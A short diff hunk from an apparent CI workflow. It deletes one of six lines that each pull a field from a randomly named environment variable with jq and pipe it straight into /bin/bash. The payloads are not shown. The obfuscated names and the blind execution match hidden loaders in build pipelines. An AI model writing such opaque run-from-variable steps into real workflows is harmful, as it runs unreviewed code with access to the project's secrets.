@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$nngj2633" | jq -r .l02721 | /bin/bash
           echo $cbokd654 | jq -r .jvot115 | /bin/bash
           echo $vzc4 | jq -r .pjbq2794 | /bin/bash
-          echo $w4 | jq -r .wk7287 | /bin/bash
           echo $uslb197 | jq -r .cipyp92824 | /bin/bash
           echo $bbxp08 | jq -r .dslm49 | /bin/bash
 
